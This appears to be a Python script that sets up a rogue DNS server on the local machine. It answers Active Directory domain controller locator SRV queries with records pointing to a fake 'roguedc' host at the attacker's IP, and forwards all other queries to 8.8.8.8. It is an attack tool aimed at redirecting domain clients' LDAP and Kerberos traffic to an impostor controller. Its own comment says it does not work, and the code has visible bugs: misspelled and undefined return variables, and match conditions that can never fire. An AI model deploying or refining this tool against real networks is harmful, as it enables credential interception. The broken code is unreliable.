from dnslib.server import DNSServer, BaseResolver, DNSLogger
from dnslib import DNSRecord, QTYPE, RR, A, SRV
import socket
import sys

# DOES NOT WORK. MUCH (MUCH!) more complicated than anticipated.

def f_roguedns(request, handler):
    qname           = request.q.qname
    qname_str       = str(qname).lower()
    qtype           = QTYPE[request.q.qtype]
    response        = request.reply()

    if qtype == "SRV" and (str(qname).lower() in ["_ldap._tcp.dc._msdcs.",  "_kerberos._tcp.dc._msdcs."]):
        domain  = qname_str.split("._msdcs.")[1].rstrip(".")
        print(f"Domain: {domain}")
        rogueDCFQDN = f"roguedc.{domain}."
        response.add_answer(RR(rname=qname, rtype=QTYPE.SRV, rdata=SRV(priority=0, weight=0, port=389, target=rogueDCFQDN), ttl=60))
        response.add_ar(RR(rname=rogueDCFQDN, rtype=QTYPE.A, rdata=A(rogueDCIP), ttl=60))
        return(reponse)
    if qtype == "SRV" and (str(qname).lower() in ["_ldap._tcp.", "_kerberos._tcp."]):
        domain  = qname_str.split("._tcp.")[1].rstrip(".")
        print(f"Domain: {domain}")
        rogueDCFQDN = f"roguedc.{domain}."
        response.add_answer(RR(rname=qname, rtype=QTYPE.SRV, rdata=SRV(priority=0, weight=0, port=389, target=rogueDCFQDN), ttl=60))
        response.add_ar(RR(rname=rogueDCFQDN, rtype=QTYPE.A, rdata=A(rogueDCIP), ttl=60))
        return(reponse)

    if qtype == "A" and str(qname).lower() == "roguedc.kestra.local":
        print(qname)
        response.add_answer(RR(rname=qname, rtype=QTYPE.A, rdata=A(rogueDCIP), ttl=60))
        return reply

    if "_ldap._tcp.dc._msdcs" in qname_str:
        try:
            domain  = qname_str.split("._msdcs.")[1].rstrip(".")
            rogueDCFQDN = f"roguedc.{domain}."
            print(f"{qname} ==> {rogueDCFQDN}")
            response.add_answer(RR(rname=qname, rtype=QTYPE.SRV, rdata=SRV(priority=0, weight=0, port=389, target=rogueDCFQDN), ttl=60))
            response.add_ar(RR(rname=rogueDCFQDN, rtype=QTYPE.A, rdata=A(rogueDCIP), ttl=60))
        except IndexError:
            print(f"Could not extract domain from {qname}")
        return response
    return DNSRecord.parse(request.send("8.8.8.8", 53, timeout=2))
    
class Resolver(BaseResolver):
    def resolve(self, request, handler):
        return f_roguedns(request, handler)
        
print(f"{sys.argv[0]} init...")
mysocket            = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
mysocket.connect(("8.8.8.8", 53))
rogueDCIP           = mysocket.getsockname()[0]
mysocket.close()
server              = DNSServer(Resolver(), port=53, address=rogueDCIP, tcp=False,  logger=DNSLogger("error", prefix=False))
print(f"Rogue DNS server on {rogueDCIP}:53/UDP...")
server.start()
